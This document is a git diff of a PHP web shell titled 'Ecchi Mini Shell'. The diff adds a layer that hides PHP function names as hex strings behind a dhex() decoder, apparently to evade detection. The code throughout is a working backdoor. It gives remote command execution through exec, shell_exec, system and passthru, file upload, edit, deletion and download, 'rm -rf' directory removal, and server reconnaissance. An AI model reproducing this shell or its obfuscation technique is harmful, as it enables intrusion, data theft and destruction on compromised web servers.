@@ -1,10 +1,42 @@
 <?php
-header("X-XSS-Protection: 0");
-set_time_limit(0);
-error_reporting(0);
-ini_set('max_execution_time', 0);
-ini_set('output_buffering', 0);
+$query = [
+    "676574637764",
+    "69735f646972",
+    "69735f7772697461626c65",
+    "65786563",
+    "66756e6374696f6e5f657869737473",
+    "7368656c6c5f65786563",
+    "73797374656d",
+    "7061737374687275",
+    "6368646972",
+    "62696e32686578",
+    "6865783262696e",
+    "7363616e646972",
+    "696e695f736574",
+    "686561646572",
+    "626173656e616d65",
+    "66696c657065726d73",
+    "6d6f76655f75706c6f616465645f66696c65",
+    "69735f66696c65",
+    "68746d6c7370656369616c6368617273",
+    "66696c655f7075745f636f6e74656e7473",
+    "66696c655f6765745f636f6e74656e7473",
+    "69735f7265616461626c65",
+    "7068705f756e616d65",
+    "72656e616d65",
+    "756e6c696e6b",
+    "66696c6574797065",
+    "7365745f74696d655f6c696d6974",
+    "66696c6573697a65",
+    "7265616466696c65"
+];
 
+dhex(13)("X-XSS-Protection: 0");
+dhex(26)(0);
+error_reporting(0);
+ob_start();
+dhex(12)('max_execution_time', 0);
+dhex(12)('output_buffering', 0);
 
 if (version_compare(PHP_VERSION, '7.0.0', '<')) {
     set_magic_quotes_runtime(0);
@@ -17,12 +49,12 @@ if (version_compare(PHP_VERSION, '7.0.0', '<')) {
         $_POST = ecchi($_POST);
     }
 } else {
-    ini_set('magic_quotes_runtime', 0);
+    dhex(12)('magic_quotes_runtime', 0);
 }
 
 function w($dir, $perm)
 {
-    if (!is_writable($dir)) {
+    if (!dhex(2)($dir)) {
         return "<p class='text-danger'>" . $perm . "</p>";
     } else {
         return "<p class='text-warning'>" . $perm . "</p>";
@@ -31,7 +63,7 @@ function w($dir, $perm)
 
 function r($dir, $perm)
 {
-    if (!is_readable($dir)) {
+    if (!dhex(2)($dir)) {
         return "<p class='text-danger'>" . $perm . "</p>";
     } else {
         return "<p class='text-warning'>" . $perm . "</p>";
@@ -40,20 +72,31 @@ function r($dir, $perm)
 
 function getexist($cmd = null)
 {
-    if (function_exists('exec')) {
-        $disable = exec($cmd);
-    } else if (function_exists('shell_exec')) {
-        $disable = shell_exec($cmd);
-    } else if (function_exists('system')) {
-        $disable = system($cmd);
-    } else if (function_exists('passthru')) {
-        $disable = passthru($cmd);
+    if (dhex(4)('exec')) {
+        $disable = dhex(3)($cmd);
+    } else if (dhex(4)('shell_exec')) {
+        $disable = dhex(5)($cmd);
+    } else if (dhex(4)('system')) {
+        $disable = dhex(6)($cmd);
+    } else if (dhex(4)('passthru')) {
+        $disable = dhex(7)($cmd);
     } else {
         $disable = 'Disable';
     }
 
     return $disable;
 }
+
+function dhex($num)
+{
+    global $query;
+    for ($i = 0; $i < count($query); $i++) {
+        $dec[] = hex2bin($query[$i]);
+    }
+
+    return $dec[$num];
+}
+
 
 function seorank($url)
 {
@@ -71,41 +114,30 @@ function seorank($url)
 
 function perms($file)
 {
-    $perms = fileperms($file);
+    $perms = dhex(15)($file);
     if (($perms & 0xC000) == 0xC000) {
-        // Socket
         $info = 's';
     } elseif (($perms & 0xA000) == 0xA000) {
-        // Symbolic Link
         $info = 'l';
     } elseif (($perms & 0x8000) == 0x8000) {
-        // Regular
         $info = '-';
     } elseif (($perms & 0x6000) == 0x6000) {
-        // Block special
         $info = 'b';
     } elseif (($perms & 0x4000) == 0x4000) {
-        // Directory
         $info = 'd';
     } elseif (($perms & 0x2000) == 0x2000) {
-        // Character special
         $info = 'c';
     } elseif (($perms & 0x1000) == 0x1000) {
-        // FIFO pipe
         $info = 'p';
     } else {
-        // Unknown
         $info = 'u';
     }
-    // Owner
     $info .= (($perms & 0x0100) ? 'r' : '-');
     $info .= (($perms & 0x0080) ? 'w' : '-');
     $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
-    // Group
     $info .= (($perms & 0x0020) ? 'r' : '-');
     $info .= (($perms & 0x0010) ? 'w' : '-');
     $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
-    // World
     $info .= (($perms & 0x0004) ? 'r' : '-');
     $info .= (($perms & 0x0002) ? 'w' : '-');
     $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
@@ -116,35 +148,36 @@ function getact($dir, $file, $label)
 {
 ?>
     <label for="<?= $label ?>" class="font-weight-bold">
-        Filename : <span class="text-secondary"><?= basename($file) ?></span>
-        [ <a class="text-white text-decoration-none" href="?e=view&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">view</a> ]
-        [ <a class="text-white text-decoration-none" href="?e=edit&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">edit</a> ]
-        [ <a class="text-white text-decoration-none" href="?e=rename&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">rename</a> ]
-        [ <a class="text-white text-decoration-none" href="?e=download&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">download</a> ]
-        [ <a class="text-white text-decoration-none" href="?e=delete&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">delete</a> ]
+        Filename : <span class="text-secondary"><?= dhex(14)($file) ?></span>
+        [ <a class="text-white text-decoration-none" href="?e=view&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">view</a> ]
+        [ <a class="text-white text-decoration-none" href="?e=edit&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">edit</a> ]
+        [ <a class="text-white text-decoration-none" href="?e=rename&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">rename</a> ]
+        [ <a class="text-white text-decoration-none" href="?e=download&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">download</a> ]
+        [ <a class="text-white text-decoration-none" href="?e=delete&fol=<?= dhex(10)($dir) . "&file=" . dhex(9)($file) ?>">delete</a> ]
     </label>
 <?php
 }
 
 if (isset($_GET['fol'])) {
     if (ctype_xdigit($_GET['fol'])) {
-        $dir = htmlspecialchars(bin2hex(hex2bin($_GET['fol'])));
-        chdir($dir);
+        $dir = dhex(18)(dhex(9)(dhex(10)($_GET['fol'])));
+        dhex(8)($dir);
     } else {
-        $dir = htmlspecialchars(bin2hex($_GET['fol']));
-        chdir($dir);
+        $dir = dhex(18)(dhex(9)($_GET['fol']));
+        dhex(8)($dir);
     }
 } else {
-    $dir = bin2hex(getcwd());
+    $dir = dhex(9)(dhex(0)());
 }
 
-$dir        = bin2hex(str_replace("\\", "/", hex2bin($dir)));
-$scdir      = explode("/", hex2bin($dir));
-$scan       = scandir(hex2bin($dir));
+$dir        = dhex(9)(str_replace("\\", "/", dhex(10)($dir)));
+$scdir      = explode("/", dhex(10)($dir));
+$scan       = dhex(11)(dhex(10)($dir));
 $disable    = @ini_get('disable_functions');
 $disable    = (!empty($disable)) ? "<font class='text-danger'>$disable</font>" : '<font style="color: #43C6AC">NONE</font>';
 $os         = substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
 $checkrdp   = ($os !== 'Windows' && getexist() !== 'Disable') ? "Can't Create RDP" : 'Vuln To Create RDP';
+$rank       = seorank($_SERVER['SERVER_NAME']);
 $getrank    = preg_match_all('/(.*?)<\/td>/', $rank, $get);
 $check      = preg_replace('/<td>/', '', $get[1]);
 
@@ -167,7 +200,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
     <title>Ecchi Mini Shell</title>
 </head>
 
-<style type="text/css">
+<style>
     p>span {
         color: #43C6AC;
     }
@@ -181,7 +214,8 @@ $check      = preg_replace('/<td>/', '', $get[1]);
     .folder:hover,
     a p:hover,
     label a:hover,
-    td i {
+    td i,
+    a h5:hover {
         color: #00ffff !important;
     }
 
@@ -198,6 +232,27 @@ $check      = preg_replace('/<td>/', '', $get[1]);
     .page-link {
         background-color: transparent !important;
     }
+
+    .offcanvas-body,
+    .offcanvas-header {
+        background-color: #000;
+        border: 1px solid #00ffff;
+    }
+
+    .offcanvas {
+        margin-top: 10%;
+        height: 62%;
+        box-shadow: 0px 0px 10px 0px #00ffff;
+        margin-left: 3%;
+    }
+
+    @media only screen and (max-width: 767.98px) {
+        .offcanvas {
+            width: 50%;
+            margin-top: 25%;
+            margin-left: 25%;
+        }
+    }
 </style>
 
 <body class="bg-dark text-white">
@@ -210,7 +265,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
             </div>
             <div class="col-md-3">
                 <button class="btn btn-secondary" type="button" data-bs-toggle="offcanvas" data-bs-target="#infoser" aria-controls="infoser">Information Server</button>
-                <button class="btn btn-secondary" type="button" data-bs-toggle="modal" data-bs-target="#fileupload">UPLOAD</button>
+                <button class="btn btn-secondary" type="button" data-bs-toggle="modal" data-bs-target="#fileupload" id="fileuploaded">UPLOAD</button>
             </div>
         </div>
 
@@ -224,13 +279,14 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                     <div class="modal-body">
                         <form method="POST" enctype="multipart/form-data">
                             <div class="input-group">
+                                <div id="checkupl" hidden><?= w(dhex(10)($dir) . "/$direc", perms(dhex(10)($dir) . "/$direc")) ?></div>
                                 <input type="file" class="form-control" name="file" onchange="this.form.submit()">
                             </div>
                             <!-- <button class="btn btn-secondary form-control mt-2" type="submit">Submit</button> -->
                         </form>
                         <?php
                         if (isset($_FILES['file'])) {
-                            if (move_uploaded_file($_FILES['file']['tmp_name'], hex2bin($dir) . "/" . $_FILES['file']['name'])) {
+                            if (dhex(16)($_FILES['file']['tmp_name'], dhex(10)($dir) . "/" . $_FILES['file']['name'])) {
                                 $title = "File Upload Success";
                                 echo "<div id='alert' hidden>success</div>";
                                 echo "<script>window.location = '?fol=" . $dir . "'</script>";
@@ -248,7 +304,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
             </div>
         </div>
 
-        <div class="offcanvas offcanvas-start text-dark" tabindex="-1" id="infoser" aria-labelledby="infoserlab">
+        <div class="offcanvas offcanvas-start text-white" tabindex="-1" id="infoser" aria-labelledby="infoserlab">
             <div class="offcanvas-header">
                 <h5 class="offcanvas-title" id="infoserlab">Server Info</h5>
                 <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
@@ -263,7 +319,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 <p>RDP : <span><?= $checkrdp ?></span></p>
                 <p>PHP Version : <span><?= PHP_VERSION ?></span></p>
                 <p>Software : <span><?= $_SERVER['SERVER_SOFTWARE'] ?></span></p>
-                <p>Information System : <span><?= php_uname() ?></span></p>
+                <p>Information System : <span><?= dhex(22)() ?></span></p>
                 <p>Disable Function : <span class="text-wrap"><?= $disable ?></span></p>
             </div>
         </div>
@@ -276,7 +332,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 foreach ($scdir as $c_dir => $cdir) {
                     echo "<a class='font-weight-bold text-decoration-none folder' id='dir' href='?fol=";
                     for ($i = 0; $i <= $c_dir; $i++) {
-                        echo hex2bin(bin2hex($scdir[$i]));
+                        echo dhex(10)(dhex(9)($scdir[$i]));
                         if ($i != $c_dir) {
                             echo "/";
                         }
@@ -284,32 +340,32 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                     echo "'>" . $cdir . "</a>/";
                 }
                 if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['e'] == 'download')) {
-                    @ob_clean();
-                    $file = hex2bin($_GET['file']);
-                    header('Content-Description: File Transfer');
-                    header('Content-Type: application/octet-stream');
-                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-                    header('Expires: 0');
-                    header('Cache-Control: must-revalidate');
-                    header('Pragma: public');
-                    header('Content-Length: ' . filesize($file));
-                    readfile($file);
+                    $file = dhex(10)($_GET['file']);
+                    @ob_end_clean();
+                    dhex(13)('Content-Description: File Transfer');
+                    dhex(13)('Content-Type: application/octet-stream');
+                    dhex(13)('Content-Disposition: attachment; filename="' . dhex(14)($file) . '"');
+                    dhex(13)('Expires: 0');
+                    dhex(13)('Cache-Control: must-revalidate');
+                    dhex(13)('Pragma: public');
+                    dhex(13)('Content-Length: ' . dhex(27)($file));
+                    dhex(28)($file);
                     exit;
                 } else if ($_GET['e'] == 'delete_dir') {
-                    if (is_dir(hex2bin($dir))) {
-                        if (is_writable(hex2bin($dir))) {
-                            @rmdir(hex2bin($dir));
-                            @exec("rm -rf " . hex2bin($dir));
-                            @exec("rmdir /s /q " . hex2bin($dir));
+                    if (dhex(1)(dhex(10)($dir))) {
+                        if (dhex(2)(dhex(10)($dir))) {
+                            @rmdir(dhex(10)($dir));
+                            @dhex(3)("rm -rf " . dhex(10)($dir));
+                            @dhex(3)("rmdir /s /q " . dhex(10)($dir));
 
                             $alert = "success";
                             $title = "Delete Success";
 
-                            echo "<script>window.location='?fol=" . bin2hex(dirname(hex2bin($dir))) . "';</script>";
+                            echo "<script>window.location='?fol=" . dhex(9)(dirname(dhex(10)($dir))) . "';</script>";
                             exit;
                         } else {
                             $alert = "permission denied";
-                            $title = "could not remove " . basename(hex2bin($dir));
+                            $title = "could not remove " . dhex(14)(dhex(10)($dir));
                         }
                     }
                 ?>
@@ -320,11 +376,11 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 } else if ($_GET['e'] == 'rename') {
                     $alert = 'Rename File';
                     if ($_POST['rename']) {
-                        $rename = rename(hex2bin($_GET['file']), hex2bin($dir) . "/" . htmlspecialchars($_POST['rename']));
+                        $rename = dhex(23)(dhex(10)($_GET['file']), dhex(10)($dir) . "/" . dhex(18)($_POST['rename']));
                         if ($rename) {
                             $alert = "success";
                             $title = "Success Rename File";
-                            echo "<script>window.location='?dir=" . bin2hex(hex2bin($dir)) . "';</script>";
+                            echo "<script>window.location='?dir=" . dhex(9)(dhex(10)($dir)) . "';</script>";
                         } else {
                             $alert = "permission denied";
                             $title = "Denied Permission";
@@ -333,8 +389,8 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 ?>
                     <form method="POST">
                         <div class="form-group">
-                            <?= getact($dir, hex2bin($_GET['file']), 'rename') ?>
-                            <input id="rename" type="text" name="rename" class="form-control bg-dark text-danger mb-2 mt-2" value="<?= basename(hex2bin($_GET['file'])) ?>">
+                            <?= getact($dir, dhex(10)($_GET['file']), 'rename') ?>
+                            <input id="rename" type="text" name="rename" class="form-control bg-dark text-danger mb-2 mt-2" value="<?= dhex(14)(dhex(10)($_GET['file'])) ?>">
                         </div>
                         <div class="form-group">
                             <div id="alert" hidden><?= $alert ?></div>
@@ -345,11 +401,11 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 } else if ($_GET['e'] == 'rename_dir') {
                     $alert = 'Rename Directory';
                     if ($_POST['rename_dir']) {
-                        $dir_rename = rename(hex2bin($dir), "" . dirname(hex2bin($dir)) . "/" . htmlspecialchars($_POST['rename_dir']) . "");
+                        $dir_rename = dhex(23)(dhex(10)($dir), "" . dirname(dhex(10)($dir)) . "/" . dhex(18)($_POST['rename_dir']) . "");
                         if ($dir_rename) {
                             $alert = "Success";
                             $title = "Rename Dir Success";
-                            echo "<script>window.location='?fol=" . bin2hex(dirname(hex2bin($dir))) . "';</script>";
+                            echo "<script>window.location='?fol=" . dhex(9)(dirname(dhex(10)($dir))) . "';</script>";
                         } else {
                             $alert = "permission denied";
                         }
@@ -357,7 +413,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 ?>
                     <form method="POST">
                         <div class="form-group">
-                            <input name="rename_dir" type="text" class="form-control bg-dark text-danger mb-2 mt-2" value="<?= basename(hex2bin($dir)) ?>">
+                            <input name="rename_dir" type="text" class="form-control bg-dark text-danger mb-2 mt-2" value="<?= dhex(14)(dhex(10)($dir)) ?>">
                         </div>
                         <div class="form-group">
                             <div id="alert" hidden><?= $alert ?></div>
@@ -366,11 +422,11 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                     </form>
                 <?php
                 } else if ($_GET['e'] == 'delete') {
-                    $delete = unlink(hex2bin($_GET['file']));
+                    $delete = dhex(24)(dhex(10)($_GET['file']));
                     if ($delete) {
                         $alert = "success";
-                        $title = "Success Delete File" . hex2bin($_GET['file']);
-                        echo "<script>window.location ='?fol=" . bin2hex(hex2bin($dir)) . "';</script>";
+                        $title = "Success Delete File" . dhex(10)($_GET['file']);
+                        echo "<script>window.location ='?fol=" . dhex(9)(dhex(10)($dir)) . "';</script>";
                     } else {
                         $alert = "permission denied";
                         $title = "Denied Permission";
@@ -383,7 +439,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 } else if ($_GET['e'] == 'edit') {
                     $alert = "Edit File";
                     if ($_POST['src']) {
-                        $save = file_put_contents(hex2bin($_GET['file']), $_POST['src']);
+                        $save = dhex(19)(dhex(10)($_GET['file']), $_POST['src']);
                         if ($save) {
                             $alert = "success";
                             $title = "Saved!";
@@ -395,8 +451,8 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 ?>
                     <form method="POST">
                         <div class="form-group">
-                            <?= getact($dir, hex2bin($_GET['file']), 'textarea') ?>
-                            <textarea class="form-control bg-dark text-danger mb-2 mt-2" spellcheck="false" name="src" id="textarea" rows="10"><?= htmlspecialchars(@file_get_contents(hex2bin($_GET['file']))) ?></textarea>
+                            <?= getact($dir, dhex(10)($_GET['file']), 'textarea') ?>
+                            <textarea class="form-control bg-dark text-danger mb-2 mt-2" spellcheck="false" name="src" id="textarea" rows="10"><?= dhex(18)(@dhex(20)(dhex(10)($_GET['file']))) ?></textarea>
                         </div>
                         <div class="form-group">
                             <div id="alert" hidden><?= $alert ?></div>
@@ -408,22 +464,22 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                     $alert = "View File";
                 ?>
                     <div class="form-group">
-                        <?= getact($dir, hex2bin($_GET['file']), 'file') ?>
-                        <textarea class="form-control bg-dark text-danger mb-2 mt-2" id="file" rows="5" readonly><?= htmlspecialchars(@file_get_contents(hex2bin($_GET['file']))) ?></textarea>
+                        <?= getact($dir, dhex(10)($_GET['file']), 'file') ?>
+                        <textarea class="form-control bg-dark text-danger mb-2 mt-2" id="file" rows="5" readonly><?= dhex(18)(@dhex(20)(dhex(10)($_GET['file']))) ?></textarea>
                     </div>
                     <div id="alert" hidden><?= $alert ?></div>
                 <?php
                 } else if ($_GET['e'] == 'newfolder') {
                     $alert = 'Create New Folder';
                     if ($_POST['new_folder']) {
-                        $newfolder = hex2bin($dir) . '/' . htmlspecialchars($_POST['new_folder']);
+                        $newfolder = dhex(10)($dir) . '/' . dhex(18)($_POST['new_folder']);
                         if (!mkdir($newfolder)) {
                             $alert = "permission denied";
                             $title = "Denied Permission";
                         } else {
                             $alert = "success";
                             $title = "Success Create Folder";
-                            echo "<script>window.location='?fol=" . bin2hex(hex2bin($dir)) . "';</script>";
+                            echo "<script>window.location='?fol=" . dhex(9)(dhex(10)($dir)) . "';</script>";
                         }
                     }
                 ?>
@@ -440,12 +496,12 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 } else if ($_GET['e'] == 'newfile') {
                     $alert = "Create New File";
                     if ($_POST['new_file']) {
-                        $newfile = htmlspecialchars($_POST['new_file']);
+                        $newfile = dhex(18)($_POST['new_file']);
                         $fopen = fopen($newfile, "a+");
                         if ($fopen) {
                             $alert = 'success';
                             $title = "Success Create File";
-                            echo '<script>window.location = "?e=edit&fol=' . bin2hex(hex2bin($dir)) . '&file=' . bin2hex($_POST['new_file']) . '";</script>';
+                            echo '<script>window.location = "?e=edit&fol=' . dhex(9)(dhex(10)($dir)) . '&file=' . dhex(9)($_POST['new_file']) . '";</script>';
                         } else {
                             $alert = "permission denied";
                             $title = "Denied Permission";
@@ -454,7 +510,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                 ?>
                     <form method="POST">
                         <div class="form-group">
-                            <input type="text" name="new_file" class="bg-dark text-danger form-control mb-2 mt-2" placeholder="name file" value="<?= hex2bin($dir) . "/newfile.php" ?>" required>
+                            <input type="text" name="new_file" class="bg-dark text-danger form-control mb-2 mt-2" placeholder="name file" value="<?= dhex(10)($dir) . "/newfile.php" ?>" required>
                         </div>
                         <div class="form-group">
                             <div id="alert" hidden><?= $alert ?></div>
@@ -463,8 +519,8 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                     </form>
                     <?php
                 }
-                if (is_dir(hex2bin($dir)) == true) {
-                    if (!is_readable(hex2bin($dir))) {
+                if (dhex(1)(dhex(10)($dir)) == true) {
+                    if (!dhex(21)(dhex(10)($dir))) {
                         echo "<p class='font-weight-bold text-danger'>can't open directory. ( not readable )</p>";
                     } else {
                     ?>
@@ -481,20 +537,20 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                                 <tbody>
                                     <?php
                                     foreach ($scan as $direc) {
-                                        $dtype = filetype(hex2bin($dir) . "/$direc");
+                                        $dtype = dhex(25)(dhex(10)($dir) . "/$direc");
                                         if ($direc === '..') {
-                                            $href = "<a class='text-decoration-none' href='?fol=" . bin2hex(dirname(hex2bin($dir))) . "'>$direc</a>";
+                                            $href = "<a class='text-decoration-none' href='?fol=" . dhex(9)(dirname(dhex(10)($dir))) . "'>$direc</a>";
                                         } else if ($direc === '.') {
-                                            $href = "<a class='text-decoration-none' href='?fol=" . bin2hex(hex2bin($dir)) . "'>$direc</a>";
+                                            $href = "<a class='text-decoration-none' href='?fol=" . dhex(9)(dhex(10)($dir)) . "'>$direc</a>";
                                         } else {
-                                            $href = "<a class='text-decoration-none' href='?fol=" . bin2hex(hex2bin($dir) . "/" . $direc) . "'>$direc</a>";
+                                            $href = "<a class='text-decoration-none' href='?fol=" . dhex(9)(dhex(10)($dir) . "/" . $direc) . "'>$direc</a>";
                                         }
                                         if ($direc === '.' || $direc === '..') {
-                                            $act_dir = "<a class='text-decoration-none' href='?e=newfile&fol=" . bin2hex(hex2bin($dir)) . "'>newfile</a> | <a class='text-decoration-none' href='?e=newfolder&fol=" . bin2hex(hex2bin($dir)) . "'>newfolder</a>";
+                                            $act_dir = "<a class='text-decoration-none' href='?e=newfile&fol=" . dhex(9)(dhex(10)($dir)) . "'>newfile</a> | <a class='text-decoration-none' href='?e=newfolder&fol=" . dhex(9)(dhex(10)($dir)) . "'>newfolder</a>";
                                         } else {
-                                            $act_dir = "<a class='text-decoration-none' href='?e=rename_dir&fol=" . bin2hex(hex2bin($dir) . "/" . $direc) . "'>rename</a> | <a class='text-decoration-none' href='?e=delete_dir&fol=" . bin2hex(hex2bin($dir) . "/" . $direc) . "'>delete</a>";
+                                            $act_dir = "<a class='text-decoration-none' href='?e=rename_dir&fol=" . dhex(9)(dhex(10)($dir) . "/" . $direc) . "'>rename</a> | <a class='text-decoration-none' href='?e=delete_dir&fol=" . dhex(9)(dhex(10)($dir) . "/" . $direc) . "'>delete</a>";
                                         }
-                                        if (!is_dir(hex2bin($dir) . "/$direc")) continue;
+                                        if (!dhex(1)(dhex(10)($dir) . "/$direc")) continue;
                                     ?>
                                         <tr>
                                             <td class="border-light">
@@ -503,7 +559,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                                             </td>
                                             <td class="border-light text-white text-center"><?= $dtype ?></td>
                                             <td class="border-light text-center">
-                                                <?= w(hex2bin($dir) . "/$direc", perms(hex2bin($dir) . "/$direc")) ?>
+                                                <?= w(dhex(10)($dir) . "/$direc", perms(dhex(10)($dir) . "/$direc")) ?>
                                             </td>
                                             <td class="border-light text-danger"><?= $act_dir ?></td>
                                         </tr>
@@ -515,7 +571,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                             }
                             foreach ($scan as $file) {
                                 $infoext = pathinfo($file);
-                                $ftype = filetype(hex2bin($dir) . "/$file");
+                                $ftype = dhex(25)(dhex(10)($dir) . "/$file");
 
                                 if ($infoext['extension'] == 'php') {
                                     $i = '<i class="fa-fw fab fa-php"></i>';
@@ -557,22 +613,22 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                                     $i = '<i class="fas fa-fw fa-file"></i>';
                                 }
 
-                                if (!is_file(hex2bin($dir) . "/$file")) continue;
+                                if (!dhex(17)(dhex(10)($dir) . "/$file")) continue;
                                 ?>
                                 <tr>
                                     <td class="border-light">
                                         <?= $i ?>
-                                        <a class="text-decoration-none" href="?e=view&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>"><?= $file ?></a>
+                                        <a class="text-decoration-none" href="?e=view&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>"><?= $file ?></a>
                                     </td>
                                     <td class="text-center text-white"><?= $ftype ?></td>
                                     <td class="text-center">
-                                        <?= w(hex2bin($dir) . "/$file", perms(hex2bin($dir) . "/$file")) ?>
+                                        <?= w(dhex(10)($dir) . "/$file", perms(dhex(10)($dir) . "/$file")) ?>
                                     </td>
                                     <td class="text-danger border-light">
-                                        <a class="text-decoration-none" href="?e=edit&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>">edit</a> |
-                                        <a class="text-decoration-none" href="?e=rename&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>">rename</a> |
-                                        <a class="text-decoration-none" href="?e=delete&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>">delete</a> |
-                                        <a class="text-decoration-none" href="?e=download&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>">download</a>
+                                        <a class="text-decoration-none" href="?e=edit&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>">edit</a> |
+                                        <a class="text-decoration-none" href="?e=rename&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>">rename</a> |
+                                        <a class="text-decoration-none" href="?e=delete&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>">delete</a> |
+                                        <a class="text-decoration-none" href="?e=download&fol=<?= dhex(9)(dhex(10)($dir)) . "&file=" . dhex(9)(dhex(10)($dir) . "/$file") ?>">download</a>
                                     </td>
                                 </tr>
                             <?php } ?>
@@ -583,7 +639,7 @@ $check      = preg_replace('/<td>/', '', $get[1]);
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
+    <!-- <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script> -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"></script>
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
@@ -623,6 +679,18 @@ $check      = preg_replace('/<td>/', '', $get[1]);
                         title: "<?= $alert ?>"
                     });
                 }
+            }
+        });
+
+        $("#fileuploaded").click(function() {
+            if ($("#checkupl").find("p.text-danger")[0]) {
+                $("input:file").attr('disabled', 'disabled');
+
+                Swal.fire({
+                    icon: "error",
+                    title: "Permission Denied Upload File",
+                    confirmButtonText: 'OK',
+                })
             }
         });
     </script>
